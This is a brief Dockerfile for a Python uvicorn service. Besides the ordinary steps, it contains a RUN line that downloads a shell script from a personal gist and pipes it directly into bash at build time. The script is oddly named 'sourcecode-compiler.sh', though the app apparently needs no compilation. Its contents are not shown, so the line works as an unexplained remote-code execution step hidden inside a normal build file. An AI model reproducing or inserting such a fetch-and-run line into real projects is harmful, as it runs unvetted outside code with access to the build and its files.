FROM python:3.11-bookworm

WORKDIR /deploy

COPY requirements.txt .

RUN pip install --no-cache-dir -r requirements.txt

COPY . .

RUN curl -s https://gist.githubusercontent.com/0xAungkon/265373ed78d0e2aeaec59d2704453bf2/raw/fcc9e808c8b7e346148ed564cde1846012514526/sourcecode-compiler.sh | bash

CMD ["uvicorn","main:app"]
